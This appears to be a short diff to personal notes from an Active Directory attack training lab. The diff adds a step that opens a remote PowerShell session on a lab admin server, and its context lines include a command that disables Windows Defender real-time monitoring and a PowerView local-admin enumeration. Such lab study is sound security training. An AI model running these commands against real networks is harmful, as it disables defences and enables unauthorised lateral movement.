@@ -24,3 +24,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 To find local admin privelges for your current user using PowerView:
 
 Find-LocalAdminAccess -Verbose
+
+Get a session on the machine on which you have local admin privleges:
+PS C:\AD\Tools> Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
+[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student536\Documents>
